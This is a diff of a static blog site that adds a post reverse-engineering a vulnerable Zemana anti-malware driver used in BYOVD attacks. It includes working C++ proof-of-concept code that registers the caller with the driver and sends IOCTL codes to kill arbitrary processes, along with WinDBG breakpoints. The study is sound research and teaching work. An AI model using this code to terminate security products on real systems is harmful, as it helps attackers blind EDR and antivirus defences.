@@ -6,10 +6,10 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>About</title>
-  <meta name='description' content='Malware Owl Blog on the Journey'>
+  <title>Quick Study of Bring Your Own Vulnerable Driver (BYOVD)</title>
+  <meta name='description' content='Quick Study of BYOVD including Root Cause Analysis and how it can be abused by attackers to disable or evade security solutions.'>
 
-  <link rel="canonical" href="https://owl4444.github.io/about/">
+  <link rel="canonical" href="http://0.0.0.0:8000/2023/06/13/Quick_Study_of_BYOVD/">
   <link rel="alternate" type="application/rss+xml" title="Malware Owl" href="/feed.xml">
 
   <!-- Fonts -->
@@ -33,7 +33,7 @@
   
 
 <!-- begin header -->
-<header class="header header--top">
+<header class="header ">
   <div class="container">
     <div class="row">
       <div class="header__inner col col-12">
@@ -64,10 +64,6 @@
     
   
     
-      
-      <li class="nav__item">
-        <a href="/about/" class="nav__link">About</a>
-      </li>
       
     
   
@@ -129,10 +125,6 @@
     
   
     
-      
-      <li class="nav__item">
-        <a href="/about/" class="nav__link">About</a>
-      </li>
       
     
   
@@ -221,68 +213,652 @@
 
   <!-- begin content -->
   <main class="content" aria-label="Content">
-    <!-- begin hero -->
-
-<section class="hero">
-  <div class="hero__inner">
-    <div class="hero__image">
-      <img class="lazy" data-src="/images/about_background.png" alt="About">
-    </div>
-    <div class="hero__content">
-      <h1 class="hero__title">About</h1>
+    <div class="post-head">
+  <div class="container">
+    <div class="row">
+      
+      <div class="col col-6 col-t-12">
+        <div class="image-box">
+          <img class="post-image lazy" data-src="/images/quickstudyBYOVD/backgroundimage.png" alt="Quick Study of Bring Your Own Vulnerable Driver (BYOVD)">
+        </div>
+      </div>
+      
+  
+      <div class="col col-6 col-t-12">
+        <div class="post-head__box">
+        
+          <div class="post__meta">
+            <span class="post__minutes">
+              
+              
+                12 min read
+              
+              <time class="post__date"
+                datetime="2023-06-13T01:27:00+00:00">Jun 13, 2023</time>
+            </span>
+          </div>
+        
+          <h2 class="post__title">Quick Study of Bring Your Own Vulnerable Driver (BYOVD)</h2>
+        
+          <div class="post__bottom">
+        
+            <div class="post__author">
+              <a href="/about/" aria-label="MalwareOwl"><img class="post__author-image"
+                  src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
+            </div>
+        
+            <div class="post__bottom-meta">
+              <a href="/about/" class="post__author-link">MalwareOwl</a>
+              
+              <span>in</span>
+              <span class="post-tags">
+                
+                <a href="/tag/QuickPeek" class="post__tag">QuickPeek</a>
+                
+                <a href="/tag/Writeups" class="post__tag">Writeups</a>
+                
+              </span>
+              
+            </div>
+          </div>
+        
+        </div>
+      </div>
     </div>
   </div>
-</section>
-
-<!-- begin hero -->
-
-<!-- begin page -->
-<div class="container">
-  <article class="page animate">
-    <div class="page__content">
-      <p>Hi, This is Malware Owl. I have always believed that writing in the form of blog posts is a good way to reinforce memory and check for in-depth understanding. Instead of just “knowing”, do I actually understand? That is the goal for this blogging exercise!</p>
-
-<p><img src="/images/profile_big.png" alt="Profile Pictures as of now" />
-<em>It’s me!</em></p>
-
-<p>Previously, I was dealing with vulnerability research and have decided to take a leap of faith to analyse malware. There are quite a number of things that are overlapping in this area. Areas includes :</p>
-<ul>
-  <li>Reverse Engineering</li>
-  <li>Source Code Audit ( if available )</li>
-  <li>Traiging / Analyzing behaviour</li>
-  <li>Report Writing</li>
-  <li>Malware containing Zero/N days exploits</li>
-</ul>
-
-<!--
-<div class="gallery-box">
-  <div class="gallery">
-    <img src="/images/900.jpg">
-    <img src="/images/901.jpg">
-    <img src="/images/902.jpg">
-  </div>
-  <em>Gallery / <a href="https://unsplash.com/" target="_blank">Unsplash</a></em>
 </div>
 
+<!-- begin post -->
+<div class="container">
+  <article class="post animate">
+
+    <div class="post__content">
+      <h1 id="quick-study-of-bring-your-own-vulnerable-driver-byovd">Quick Study of Bring Your Own Vulnerable Driver (BYOVD)</h1>
+<hr />
+
+<p>Yesterday, I came across a concept in Twitter known as Bring Your Own Vulnerable Driver (BYOVD). Intrigued by this notion, I have decided to delve into an example to learn some details and intricacies of BYOVD.</p>
+
+<p>This little quest led me to an article published by SC Magazine which explains a little more about this concept. According to the artcile titled “Novel Terminator Antivirus Killer Found to Be a BYOVD Attack”, there was a recent emergence of an attack that was initially dubbed “Novel Terminator Antirus Killer”. The attack, attributed to threat actor, Spyboy, was subsequently discovered to be an instance of BYOVD. As the name implies, it involves the utilization of existing administrative permissions to deploy a legitimately-signed but vulnerable driver. In the case of the Novel Terminator Antivirus Killer, the driver in question is <code class="language-plaintext highlighter-rouge">zam64.sys</code>. The malware, having been granted administrative privilege, exploits the vulnerability present in it. As a result, it is abused by terminating an extensive array of established Endpoint Detection and Response (EDR), Extended Detection and Response (XDR), and Antivirus (AV) solutions.</p>
+
+<p>Interestingly, ZeroMemoryEx has reproduced Spyboy technique as seen in <a href="https://github.com/ZeroMemoryEx/Terminator">https://github.com/ZeroMemoryEx/Terminator</a>. It also details that the vulnerable driver can be downloaded from <a href="https://www.loldrivers.io/drivers/49920621-75d5-40fc-98b0-44f8fa486dcc/">https://www.loldrivers.io/drivers/49920621-75d5-40fc-98b0-44f8fa486dcc/</a> and a quick technical detail.</p>
+
+<h2 id="environment">Environment</h2>
+
+<p>This study is conducted on Windows 10 Version 20H2. Choice of debugger is WinDBG for kernel debugging.</p>
+
+<h2 id="description">Description</h2>
+<p>Terminator.sys is a legitimate but vulnerable driver from Zemana AntiMalware. It has abilities to terminate of process by PID. Legitimately, I believe that if Zemana AntiMalware detects a malicious process, it would terminate it via <code class="language-plaintext highlighter-rouge">IOCTL_TERMINATE_PROCESS</code> control code by processes that is trusted. To be known as a trusted process by Zemana AntiMalware, the trusted process’ PID has to be registered. I have also tried to go into the motion of writing a POC to see how this vulnerability could have been found as well.</p>
+
+<h2 id="root-cause">Root Cause</h2>
+<p>This registration can be easily done via another Device Control Code <code class="language-plaintext highlighter-rouge">IOCTL_REGISTER_PROCESS</code> assuming you have administrative privilege. Furthermore, there is no checks on which process is calling sending this code which makes it possible for any privileged process to register itself. Once registered, it can now send <code class="language-plaintext highlighter-rouge">IOCTL_TERMINATE_PROCESS</code> to terminate any process as long as the PID is provided with the input.</p>
+
+<h2 id="reverse-engineering">Reverse Engineering</h2>
+<p>Upon deployment, driver would initialize, create device object and verify itself. Additionally, major functions of the <code class="language-plaintext highlighter-rouge">DriverObject</code> are initialized.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">...</span>
+
+    <span class="n">memset64</span><span class="p">(</span><span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sub_14001147C</span><span class="p">,</span> <span class="mh">0x1Cu</span><span class="n">i64</span><span class="p">);</span>
+    <span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_CREATE</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDRIVER_DISPATCH</span><span class="p">)</span><span class="n">sub_14001049C</span><span class="p">;</span>
+    <span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_CLOSE</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDRIVER_DISPATCH</span><span class="p">)</span><span class="n">sub_14001049C</span><span class="p">;</span>
+    <span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_DEVICE_CONTROL</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDRIVER_DISPATCH</span><span class="p">)</span><span class="n">sub_1400104BC</span><span class="p">;</span>
+    <span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">DriverUnload</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDRIVER_UNLOAD</span><span class="p">)</span><span class="n">sub_140011384</span><span class="p">;</span>
+    <span class="n">v4</span> <span class="o">=</span> <span class="n">IoCreateDevice</span><span class="p">(</span><span class="n">DriverObject</span><span class="p">,</span> <span class="mh">0x10u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">DeviceName</span><span class="p">,</span> <span class="mh">0x22u</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v11</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Index 14 corresponds to IRP_MJ_DEVICE_CONTROL, which is used for custom device control operations.This means that this function relies on Control Codes specific for device control operations. For more details, refer to <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/creating-ioctl-requests-in-drivers">https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/creating-ioctl-requests-in-drivers</a>.</p>
+
+<p>Without knowing the context, the most flavorful IOCTL, based on the article, should be <code class="language-plaintext highlighter-rouge">IOCTL_TERMINATE_PROCESS</code>. For this study, this is where I first looked at since the goal would be to terminate security solutions. We can find that in <code class="language-plaintext highlighter-rouge">sub_1400104BC</code> which is assigned to <code class="language-plaintext highlighter-rouge">IRP_MJ_DEVICE_CONTROL</code> index. We can also determine the control code to be <code class="language-plaintext highlighter-rouge">0x80002048</code>.</p>
+
+<p><img src="/images/quickstudyBYOVD//IOCTL_TERMINATE_PROCESS.png" alt="/images/quickstudyBYOVD//IOCTL_TERMINATE_PROCESS.png" /></p>
+
+<h2 id="attempt-to-terminate-notepad-failed">Attempt to Terminate Notepad (Failed)</h2>
+
+<p>To send control codes, we can make use of <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> function.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">DeviceIoControl</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">HANDLE</span>       <span class="n">hDevice</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">DWORD</span>        <span class="n">dwIoControlCode</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPVOID</span>       <span class="n">lpInBuffer</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">DWORD</span>        <span class="n">nInBufferSize</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>     <span class="n">LPVOID</span>       <span class="n">lpOutBuffer</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">DWORD</span>        <span class="n">nOutBufferSize</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>     <span class="n">LPDWORD</span>      <span class="n">lpBytesReturned</span><span class="p">,</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPOVERLAPPED</span> <span class="n">lpOverlapped</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>According to MSDN, <code class="language-plaintext highlighter-rouge">hDevice</code> is a handle to the device on which the operation is to be performed. The device is typically a volume, directory, file or stream. To retrieve a device hadnle, use the CreateFile function. First thing we can try to do this is to look for named pipes in winDBG via the <code class="language-plaintext highlighter-rouge">!handle</code> command.</p>
+
+<p><img src="/images/quickstudyBYOVD//handle.png" alt="handle.png" /></p>
+
+<p>We can see the SymbolicLink for <code class="language-plaintext highlighter-rouge">ZemanaAntiMalware</code>. We can get more information about it with <code class="language-plaintext highlighter-rouge">!object &lt;handle address&gt;</code>.</p>
+
+<p><img src="/images/quickstudyBYOVD//handleobjectdetails.png" alt="handleobjectdetails.png" /></p>
+
+<p>Since the target string is <code class="language-plaintext highlighter-rouge">\Device\ZemanaAntiMalware</code>, the created file should have the named pipe of <code class="language-plaintext highlighter-rouge">\\.\ZemanaAntiMalware</code>.</p>
+
+<p>The following script built and ran with administrative privilege. Furthermore, the PID of the opened notepad is included in the script and make sure that Terminator has been successfully deployed into the target machine.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+
+<span class="k">const</span> <span class="n">LONGLONG</span> <span class="n">IOCTL_TERMINATE_PROCESS</span> <span class="o">=</span> <span class="mh">0x80002048</span><span class="p">;</span>
+<span class="k">const</span> <span class="kt">int</span> <span class="n">PID_TO_TERMINATE</span> <span class="o">=</span> <span class="mi">3524</span><span class="p">;</span> <span class="c1">// Hardcoded PID ( change each time )</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">HANDLE</span> <span class="n">hDevice</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">bytesReturned</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+    <span class="c1">// Open a handle to the device through the symbolic link</span>
+    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">ZemanaAntiMalware"</span><span class="p">,</span>
+        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span>
+        <span class="nb">NULL</span><span class="p">,</span>
+        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
+        <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
+        <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to open handle to device. Error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Send control code IOCTL_TERMINATE_PROCESS to the driver</span>
+    <span class="n">DWORD</span> <span class="n">input</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">PID_TO_TERMINATE</span><span class="p">,</span> <span class="n">TRUE</span> <span class="p">};</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_TERMINATE_PROCESS</span><span class="p">,</span><span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to Terminate PID %d via control code. Error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">PID_TO_TERMINATE</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Successfully terminated PID %d sent control code.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">PID_TO_TERMINATE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Close the handle</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Upon running, I was greeted with the following error.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Failed to Terminate PID 3524 via Control code. Error: 5
+</code></pre></div></div>
+
+<h2 id="debugging-the-failure">Debugging the Failure</h2>
+
+<p>First thing to verify is to check if the Control Code has been received.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bu Terminator+0x1054C
+</code></pre></div></div>
+
+<p><img src="/images/quickstudyBYOVD//check_control_code_terminate_process.png" alt="/images/quickstudyBYOVD//check_control_code_terminate_process.png" /></p>
+
+<p>Running the exectuble would cause the breakpoint to be hit. We can also verify that the control code <code class="language-plaintext highlighter-rouge">IOCTL_TERMINATE_PROCESS</code> is received by the driver as well.</p>
+
+<p><img src="/images/quickstudyBYOVD//IOCTL_TERMINATE_PROCESS_RECEIVED.png" alt="IOCTL_TERMINATE_PROCESS_RECEIVED.png" /></p>
+
+<p>Next thing to verify is to check if the block for terminating process has been reached.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bu Terminator+0x10B14
+</code></pre></div></div>
+<p><img src="/images/quickstudyBYOVD//check_if_terminate_reached.png" alt="check_if_terminate_reached.png" /></p>
+
+<p>Here, we will observe that after resuming the process, the breakpoint was not hit. This means that there might be a check before executing the corresponding instructions.</p>
+
+<h2 id="can-i-authorize-myself">Can I Authorize Myself?</h2>
+
+<p>Just before sending IOCTL, there was a check to see if PIDs are registered. Before that is done, the PID of the driver is passed. The purpose is to also authorize itself.</p>
+
+<p><img src="/images/quickstudyBYOVD//Check_if_pid_registered_sub140009bec.png" alt="/images/quickstudyBYOVD//Check_if_pid_registered_sub140009bec.png" /></p>
+
+<p>After some reversing and debugging, we see that <code class="language-plaintext highlighter-rouge">Check_IF_PID_Registered_sub_140009BEC</code> initially does not have any registered PID (external processes). Because of that, the  <code class="language-plaintext highlighter-rouge">IS_PID_WHITELISTED</code> value is never 1. Furthermore, it is checking through the PID list of registered processes that are authorized to send IOCTLs.</p>
+
+<p>That said, looking into how <code class="language-plaintext highlighter-rouge">numRegisteredPID</code> is set should give us an idea on how these PID are registered. Looking at the cross references, we see that <code class="language-plaintext highlighter-rouge">Check_IF_PID_Registered_sub_140009BEC</code> is called from <code class="language-plaintext highlighter-rouge">register_PID_if_not_registered_sub_140009DB0</code> which is called from <code class="language-plaintext highlighter-rouge">sub_140010270</code> which is also called from executing <code class="language-plaintext highlighter-rouge">IOCTL_REGISTER_PROCESS</code> control code.</p>
+
+<p><img src="/images/quickstudyBYOVD//IOCTL_REGISTER_PROCESS.png" alt="IOCTL_REGISTER_PROCESS.png" /></p>
+
+<p>Checking the conditions above again, we can see that this control code is exempted from the checks.</p>
+
+<p><img src="/images/quickstudyBYOVD//IOCTL_REGISTER_PROCESS_EXEMPTED.png" alt="/images/quickstudyBYOVD//IOCTL_REGISTER_PROCESS_EXEMPTED.png" /></p>
+
+<p>This means also that there is no further check to see who could send this particular control code very similar to that of authentication bypass. This means that an external process with administrative privilege is able to register itself as trusted process which can send control codes.</p>
+
+<h2 id="second-attempt-success">Second Attempt (Success)</h2>
+
+<p>This time, I have added another <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> to send <code class="language-plaintext highlighter-rouge">IOCTL_REGISTER_PROCESS</code> code. I have also edited the POC a little to make it easier for testing.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+
+<span class="k">const</span> <span class="n">LONGLONG</span> <span class="n">IOCTL_TERMINATE_PROCESS</span> <span class="o">=</span> <span class="mh">0x80002048</span><span class="p">;</span>
+<span class="k">const</span> <span class="n">LONGLONG</span> <span class="n">IOCTL_REGISTER_PROCESS</span> <span class="o">=</span> <span class="mh">0x80002010</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">PID_TO_TERMINATE</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 
 
-SOME TEXT HERE IF YOU WANT
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">HANDLE</span> <span class="n">hDevice</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">bytesReturned</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: RootCauseTerminator.exe &lt;TargetPID&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">PID_TO_TERMINATE</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
 
-<p><iframe src="https://www.youtube.com/embed/QyQ85DEVpbc" frameborder="0" allowfullscreen></iframe></p>
+    <span class="c1">// Open a handle to the device through the symbolic link</span>
+    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">ZemanaAntiMalware"</span><span class="p">,</span>
+        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span>
+        <span class="nb">NULL</span><span class="p">,</span>
+        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
+        <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
+        <span class="nb">NULL</span><span class="p">);</span>
 
--->
+    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to open handle to device. Error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
 
-<p>I have been curious about Malware for a while now after reading numerous online posts, tweets, and forums. Due to that, I have decided to start my journey to analyze and document interesting techniques that I have seen (may be things that may or may not be common). Again, it is just my way of learning !</p>
+    
+    <span class="c1">// Register this executable PID to allow itself to send IOCTL_TERMINATE_PROCESS control code to terminator driver.</span>
+    <span class="n">DWORD</span> <span class="n">regProcessInput</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">GetCurrentProcessId</span><span class="p">()</span> <span class="p">};</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_REGISTER_PROCESS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regProcessInput</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">regProcessInput</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to register itself...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"REGISTERED SUCCESSFULLY</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
 
-<p>While I am aware that there are immense amount of materials and tricks, I am determined to learn as much as I can and blog any interesting concepts that I find with the goal of eduacating! Furthermore, this blog is not and should not be limited to just Malware Analysis. I may include things like interesting N-days or CTF Writeups if any in the near future!</p>
+
+    <span class="c1">// Send control code IOCTL_TERMINATE_PROCESS to the driver</span>
+    <span class="n">DWORD</span> <span class="n">input</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">PID_TO_TERMINATE</span><span class="p">,</span><span class="n">TRUE</span> <span class="p">};</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_TERMINATE_PROCESS</span><span class="p">,</span><span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Failed to Terminate PID %d via control code. Error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">PID_TO_TERMINATE</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Successfully terminated PID %d after sending control code.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">PID_TO_TERMINATE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Close the handle</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="110-it-works">110% It Works?</h2>
+
+<p>First thing to verify is to check that the POC has managed to register and authorize itself to send control code.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Check value of v9 for control code
+# if ( v9 != 0x80002010 ) 
+bu Terminator+0x1054D
+
+# Check PID and make sure it matches executable
+# Check with !process 0 0 RootCauseTerminator.exe
+bu Terminator+0x09DDB
+
+# Check if this is hit. If yes, then we have registered ourselves
+# if breakpoint fails to hit, then we failed
+#  numRegisteredPID = (numRegisteredPID + 1) % 0x64ui64;
+bu Terminator+0x09EE8
+</code></pre></div></div>
+
+<p>Sure enough, the control code was received.</p>
+
+<p><img src="/images/quickstudyBYOVD//registeredcode.png" alt="registeredcode.png" /></p>
+
+<p>Also, we can verify that the PID of the executable is being registered because the PID matches and that the numRegisteredPID was successfully incremented.</p>
+
+<p>Next thing to verify termination is to check that the POC can now enter into the block for <code class="language-plaintext highlighter-rouge">IOCTL_TERMINATE_PROCESS</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Enter into case 0x80002048 (IOCTL_TERMINATE_PROCESS)
+bu Terminator+0x10B14
+
+# Check the PID of notepad with this value in rdi
+bu Terminator+0x132C6
+
+# Check if this breakpoint gets hit
+# call cs:ZwTerminateProcess
+bu Terminator+0x013487
+</code></pre></div></div>
+
+<p>The following shows that it can kill the targeted PID. The PID is confirmed to belong to the notepad process and the call to <code class="language-plaintext highlighter-rouge">ZwTerminateProcess</code> is also successful.</p>
+
+<p><img src="/images/quickstudyBYOVD//process_kill.png" alt="process_kill.png" /></p>
+
+<p>Ultimately, the process would be wiped off process hacker.</p>
+
+<h2 id="zeromemoryexs-terminator-reproduction">ZeroMemoryEx’s Terminator Reproduction</h2>
+
+<p>As mentioned previously, ZeroMemoryEx has reproduced SpyBoy’s work as seen in <a href="https://github.com/ZeroMemoryEx/Terminator">https://github.com/ZeroMemoryEx/Terminator</a> which I have referenced. It would loop through all the processes to search for any blacklisted Security Product for termination and terminating them.</p>
+
+<p><img src="/images/quickstudyBYOVD//blacklistprocesses.png" alt="/images/quickstudyBYOVD//blacklistprocesses.png" /></p>
+
+<p>This demonstrates the possibility of attackers, after some form of privilege escalation, installing other malware/payloads with higher confidence of not being flagged too early at the very least.</p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>This short study had helped me understand how LOLbins may be abused for malicious intent. It also helped me understand how these can be applied in an attack chain to further evade detections as well from different security solutions.</p>
 
 <hr />
 
 
     </div>
+
+    <div class="post__share">
+      <div class="share__list">
+        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://0.0.0.0:8000/2023/06/13/Quick_Study_of_BYOVD/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+
+        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=Quick%20Study%20of%20Bring%20Your%20Own%20Vulnerable%20Driver%20(BYOVD)&url=http://0.0.0.0:8000/2023/06/13/Quick_Study_of_BYOVD/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+
